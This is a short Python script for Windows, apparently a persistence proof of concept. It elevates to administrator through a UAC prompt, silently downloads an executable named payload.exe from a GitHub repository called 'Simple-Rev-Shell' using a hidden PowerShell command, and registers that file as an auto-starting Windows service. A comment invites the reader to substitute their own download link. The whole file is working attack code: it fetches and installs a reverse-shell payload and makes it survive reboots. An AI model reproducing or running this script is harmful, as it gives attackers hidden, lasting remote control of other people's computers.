import subprocess, os, ctypes, sys

# Ai code (not dealing with windll bs)
if not ctypes.windll.shell32.IsUserAnAdmin():
    ctypes.windll.shell32.ShellExecuteW(
        None, "runas", sys.executable, " ".join(sys.argv), None, 1
    )
    sys.exit()
#######################################

directory = r"C:\Program Files\PoC_Persistance"

pricetopay = rf"powershell -Command iwr https://raw.githubusercontent.com/larplimiter14/Simple-Rev-Shell-/refs/heads/main/SimpleRevShell/payload.exe -OutFile 'c:\program files\PoC_Persistance\poc.exe'" # Put in ur own github/download link

os.makedirs(directory, exist_ok=True)

subprocess.run(pricetopay, creationflags=subprocess.CREATE_NO_WINDOW)
subprocess.run(rf'sc create PoC_Persistance binPath="c:\program files\PoC_Persistance\poc.exe" start=Auto', creationflags=subprocess.CREATE_NO_WINDOW)
